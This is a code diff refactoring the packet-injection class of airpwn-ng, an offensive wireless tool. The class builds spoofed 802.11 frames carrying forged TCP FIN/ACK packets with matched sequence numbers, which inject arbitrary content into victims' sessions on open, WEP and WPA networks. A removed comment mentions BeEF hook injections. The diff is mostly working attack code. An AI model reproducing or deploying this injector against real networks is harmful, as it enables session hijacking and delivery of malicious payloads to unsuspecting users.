@@ -14,14 +14,7 @@ from scapy.layers.inet import IP, TCP
 from scapy.layers.l2 import Ether, LLC, SNAP
 from scapy.packet import Padding, Raw
 from scapy.sendrecv import __gen_send as gs
-
-
-## DEBUG
 from scapy.utils import wrpcap
-
-## GLOBALS
-global npackets
-npackets = 0
 
 class Injector(object):
     """Uses scapy to inject packets on the networks"""
@@ -29,14 +22,9 @@ class Injector(object):
     def __init__(self, interface, args):
         self.interface = interface
         self.args = args
+        self.hdr = Headers()
         self.injSocket = conf.L2socket(iface = interface)
 
-        ## Create a header that works for encrypted wifi having FCS
-        ### These bytes can be switched up =)
-        ## If memory serves, this is a channel 6 RadioTap()
-        rTap = '00 00 26 00 2f 40 00 a0 20 08 00 a0 20 08 00 00 20 c8 af c8 00 00 00 00 10 6c 85 09 c0 00 d3 00 00 00 d2 00 cd 01'
-        self.rTap = RadioTap(unhexlify(rTap.replace(' ', '')))
-        
         ## Managed mode injection
         if args.m != args.i:
             self.injMac = scapy.arch.get_if_hwaddr(interface)
@@ -61,69 +49,67 @@ class Injector(object):
         Things such as payload and associated flags are genned here
         FIN/ACK flag is sent to the victim with this method
         """
-        global npackets
-        npackets += 1
-        sys.stdout.write(Bcolors.OKBLUE + '[*] Injecting Packet to victim ' + Bcolors.WARNING + vicmac + Bcolors.OKBLUE + ' (TOTAL: ' + str(npackets) + ' injected packets)\r' + Bcolors.ENDC)
-        sys.stdout.flush()
 
-        ## Injection using Monitor Mode
+        ## Headers
+        headers = self.hdr.default(injection)
+
+        ## Monitor
         if self.args.inj == 'mon':
-            hdr = Headers()
-            headers = hdr.default(injection)
 
             ## WEP/WPA
             if self.args.wep or self.args.wpa:
-                packet = self.rTap\
-                        /Dot11(
-                              FCfield = 'from-DS',
-                              addr1 = vicmac,
-                              addr2 = rtrmac,
-                              addr3 = dstmac,
-                              subtype = 8,
-                              type = 2
-                              )\
-                        /Dot11QoS()\
-                        /LLC()\
-                        /SNAP()\
-                        /IP(
-                           dst = vicip,
-                           src = svrip
-                           )\
-                        /TCP(
-                            flags = 'FA',
-                            sport = int(svrport),
-                            dport = int(vicport),
-                            seq = int(seqnum),
-                            ack = int(acknum)
+                packet = RadioTap()\
+                         /Dot11(
+                               FCfield = 'from-DS',
+                               addr1 = vicmac,
+                               addr2 = rtrmac,
+                               addr3 = dstmac,
+                               subtype = 8,
+                               type = 2
+                               )\
+                         /Dot11QoS()\
+                         /LLC()\
+                         /SNAP()\
+                         /IP(
+                            dst = vicip,
+                            src = svrip
                             )\
-                        /Raw(
-                            load = headers + injection
-                            )
+                         /TCP(
+                             flags = 'FA',
+                             sport = int(svrport),
+                             dport = int(vicport),
+                             seq = int(seqnum),
+                             ack = int(acknum)
+                             )\
+                         /Raw(
+                             load = headers + injection
+                             )
+
             ## Open
             else:
                 packet = RadioTap()\
-                        /Dot11(
-                              FCfield = 'from-DS',
-                              addr1 = vicmac,
-                              addr2 = rtrmac,
-                              addr3 = dstmac
-                              )\
-                        /LLC()\
-                        /SNAP()\
-                        /IP(
-                           dst = vicip,
-                           src = svrip
-                           )\
-                        /TCP(
-                            flags = 'FA',
-                            sport = int(svrport),
-                            dport = int(vicport),
-                            seq = int(seqnum),
-                            ack = int(acknum)
+                         /Dot11(
+                               FCfield = 'from-DS',
+                               addr1 = vicmac,
+                               addr2 = rtrmac,
+                               addr3 = dstmac
+                               )\
+                         /LLC()\
+                         /SNAP()\
+                         /IP(
+                            dst = vicip,
+                            src = svrip
                             )\
-                        /Raw(
-                            load = headers + injection
-                            )
+                         /TCP(
+                             flags = 'FA',
+                             sport = int(svrport),
+                             dport = int(vicport),
+                             seq = int(seqnum),
+                             ack = int(acknum)
+                             )\
+                         /Raw(
+                             load = headers + injection
+                             )
 
             if TSVal is not None and TSecr is not None:
                 packet[TCP].options = [
@@ -138,7 +124,7 @@ class Injector(object):
                                       ('Timestamp', ((round(time.time()), 0)))
                                       ]
 
-            ## WPA Injection
+            ## WPA
             if self.args.wpa is not None:
                 if self.shake.encDict.get(vicmac) == 'ccmp':
 
@@ -162,13 +148,6 @@ class Injector(object):
                     sys.stdout.write(Bcolors.FAIL + '\n[!] airpwn-ng cannot inject TKIP natively\n[!] Injection failed\n ' + Bcolors.ENDC)
                     sys.stdout.flush()
 
-
-                ### DEBUG ~~> verbosity
-                gs(self.injSocket, packet, verbose = False)
-
-                ### DEBUG ~~> pcap
-                # wrpcap('outbound.pcap', packet)
-
             ## WEP Injection
             elif self.args.wep is not None:
                 try:
@@ -177,29 +156,9 @@ class Injector(object):
                     sys.stdout.write(Bcolors.FAIL + '\n[!] pyDot11 did not work\n[!] Injection failed\n ' + Bcolors.ENDC)
                     sys.stdout.flush()
 
-                ### DEBUG ~~> verbosity
-                gs(self.injSocket, packet, verbose = False)
-
-                ### DEBUG ~~> pcap
-                #wrpcap('outbound.pcap', packet)
-
-
-            ## Open WiFi Injection
-            else:
-                ### DEBUG ~~> verbosity
-                gs(self.injSocket, packet, verbose = False)
-
-                ### DEBUG ~~> pcap
-                # wrpcap('outbound.pcap', packet)
-
-            ### DEBUG ~~> Single point injects - BeEF hook examples and such
-            # sys.stdout.write(Bcolors.OKBLUE + '[*] Injecting Packet to victim ' + Bcolors.WARNING + vicmac + Bcolors.OKBLUE + ' (TOTAL: ' + str(npackets) + ' injected packets)\r' + Bcolors.ENDC)
-            # sys.exit(0)
-
-        ## Injection using Managed Mode
+        ## Managed
         else:
-            hdr = Headers()
-            headers = hdr.default(injection)
+            headers = self.hdr.default(injection)
             packet = Ether(\
                           src = self.injMac,\
                           dst = vicmac\
@@ -232,8 +191,9 @@ class Injector(object):
                                       ('Timestamp', ((round(time.time()), 0)))\
                                       ]
 
-            ### DEBUG ~~> verbosity
-            gs(self.injSocket, packet, verbose = False)
-
-            ### DEBUG ~~> pcap
-            # wrpcap('outbound.pcap', packet)
+        ## Inject
+        gs(self.injSocket, packet, verbose = False)
+        print('[*] Packet injected to {0}'.format(vicmac))
+        
+        ### DEBUG ~~> pcap
+        # wrpcap('outbound.pcap', packet)
